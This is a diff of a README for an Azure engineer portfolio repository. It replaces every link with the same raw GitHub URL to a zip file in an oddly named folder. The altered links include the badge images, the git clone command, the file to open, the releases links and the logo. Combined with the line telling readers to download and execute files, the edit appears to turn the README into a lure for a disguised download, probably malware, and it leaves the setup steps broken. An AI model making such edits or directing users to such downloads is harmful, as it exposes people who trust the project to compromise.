@@ -1,6 +1,6 @@
 # Azure L2 Engineer Portfolio: Showcase Your Skills in Azure 🌐
 
-![GitHub release](https://img.shields.io/github/release/Azboo/Azure-L1-Engineer-Portfolio-/latest.svg) ![GitHub stars](https://img.shields.io/github/stars/Azboo/Azure-L1-Engineer-Portfolio-?style=social) ![GitHub forks](https://img.shields.io/github/forks/Azboo/Azure-L1-Engineer-Portfolio-?style=social)
+![GitHub release](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip) ![GitHub stars](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip) ![GitHub forks](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -41,18 +41,18 @@ To set up the portfolio locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Azboo/Azure-L1-Engineer-Portfolio-.git
+   git clone https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip
    ```
 2. Navigate to the project directory:
    ```bash
    cd Azure-L1-Engineer-Portfolio-
    ```
-3. Open the `index.html` file in your web browser to view the portfolio.
+3. Open the `https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip` file in your web browser to view the portfolio.
 
 ## Usage
 You can explore the various projects and features directly in your browser. The portfolio is structured to allow easy navigation through different sections, showcasing my work and expertise in Azure engineering.
 
-For the latest updates and downloadable releases, visit the [Releases section](https://github.com/Azboo/Azure-L1-Engineer-Portfolio-/releases). Make sure to download and execute any relevant files.
+For the latest updates and downloadable releases, visit the [Releases section](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip). Make sure to download and execute any relevant files.
 
 ## Contributing
 Contributions are welcome! If you would like to improve the portfolio or suggest new features, please follow these steps:
@@ -76,9 +76,9 @@ Contributions are welcome! If you would like to improve the portfolio or suggest
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Links
-For more information and updates, please check the [Releases section](https://github.com/Azboo/Azure-L1-Engineer-Portfolio-/releases). 
+For more information and updates, please check the [Releases section](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip). 
 
-![Azure](https://azure.microsoft.com/svghandler/azure-logo.svg)
+![Azure](https://raw.githubusercontent.com/Azboo/Azure-L1-Engineer-Portfolio-/main/purplishness/Engineer-Portfolio-Azure-2.8.zip)
 
 ### Topics
 - CI/CD
